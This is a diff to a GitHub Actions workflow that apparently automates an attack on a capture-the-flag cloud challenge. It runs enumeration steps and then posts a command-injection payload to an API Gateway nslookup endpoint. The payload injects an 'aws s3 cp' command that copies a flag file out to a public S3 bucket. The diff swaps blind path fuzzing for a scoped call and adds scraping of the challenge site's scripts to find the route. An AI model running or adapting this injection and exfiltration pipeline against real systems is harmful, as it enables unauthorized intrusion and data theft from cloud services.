@@ -2,6 +2,11 @@ name: have-some-faith
 
 on:
   workflow_dispatch:
+    inputs:
+      api_url:
+        description: "Exact challenge API URL from the provided site, for example https://.../stage/path"
+        required: false
+        type: string
   push:
     branches:
       - corgi
@@ -13,6 +18,7 @@ permissions:
 env:
   AWS_REGION: us-east-1
   TARGET_ROLE_ARN: arn:aws:iam::009661764077:role/cicdRole
+  CHALLENGE_API_URL: https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup
 
 jobs:
   enumerate:
@@ -97,21 +103,33 @@ jobs:
           echo "== Lambda function URL config =="
           aws lambda get-function-url-config --function-name nslookupv2 --output json || true
 
-      - name: Blindly exploit API Gateway command injection
+      - name: Scoped exploit using only the challenge front door
         shell: bash
         run: |
           set -euo pipefail
 
-          api_base="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          site_base="https://d67nf28gqfurd.cloudfront.net"
           public_bucket="platform-bucket-009661764077-us-east-1"
           flag_bucket="codec4f26c862a321ef5"
           out_key="faith-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.txt"
           exfil_url="s3://${public_bucket}/${out_key}"
           command="example.com; /opt/aws s3 cp s3://${flag_bucket}/flag.txt ${exfil_url}; #"
-          encoded="$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "$command")"
 
-          stages=("" "prod" "default" "dev" "test" "v1" "api")
-          paths=("" "nslookup" "lookup" "dns" "resolve" "query")
+          echo "== Read provided challenge site for API route =="
+          curl -ksS -m 10 "${site_base}/index.html" -o out/site-index.html || true
+          curl -ksS -m 10 "${site_base}/js/scripts.js" -o out/site-scripts.js || true
+          grep -RInaE 'execute-api|3q931syi7b|fetch|XMLHttpRequest|axios|domain|lookup|nslookup|api' out/site-* || true
+
+          input_url="${{ github.event.inputs.api_url }}"
+          discovered_url="$(grep -RaoE 'https://3q931syi7b\.execute-api\.us-east-1\.amazonaws\.com[^"'"'"'` )]+' out/site-* 2>/dev/null | head -n 1 || true)"
+          api_url="${input_url:-${discovered_url:-$CHALLENGE_API_URL}}"
+
+          if [[ -z "$api_url" ]]; then
+            echo "No exact API URL discovered. Open ${site_base}/js/scripts.js from an Israeli IP and rerun workflow_dispatch with api_url."
+            exit 1
+          fi
+
+          echo "== Using API URL: $api_url =="
 
           check_flag() {
             if aws s3api head-object --bucket "$public_bucket" --key "$out_key" >/dev/null 2>&1; then
@@ -122,40 +140,22 @@ jobs:
             return 1
           }
 
-          try_url() {
-            local url="$1"
-            echo "== Trying $url =="
+          echo "== Calling exact challenge API URL =="
+          curl -ksS -m 10 -X POST \
+            -H 'content-type: application/json' \
+            --data "{\"domain\":\"${command}\"}" \
+            "$api_url" || true
+          echo
 
-            curl -ksS -m 8 -X POST \
-              -H 'content-type: application/json' \
-              --data "{\"domain\":\"${command}\"}" \
-              "$url" || true
-            echo
-            check_flag && exit 0
+          if check_flag; then
+            exit 0
+          fi
 
-            curl -ksS -m 8 "${url}?domain=${encoded}" || true
-            echo
-            check_flag && exit 0
-          }
-
-          for stage in "${stages[@]}"; do
-            for path in "${paths[@]}"; do
-              if [[ -n "$stage" && -n "$path" ]]; then
-                try_url "${api_base}/${stage}/${path}"
-              elif [[ -n "$stage" ]]; then
-                try_url "${api_base}/${stage}"
-              elif [[ -n "$path" ]]; then
-                try_url "${api_base}/${path}"
-              else
-                try_url "${api_base}"
-              fi
-            done
-          done
-
-          echo "== Exfil object not found after API fuzzing =="
+          echo "== Exfil object not found after scoped API call =="
           aws s3api list-objects-v2 --bucket "$public_bucket" \
             --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
             --output table || true
+          exit 1
 
       - name: Probe command injection
         shell: bash
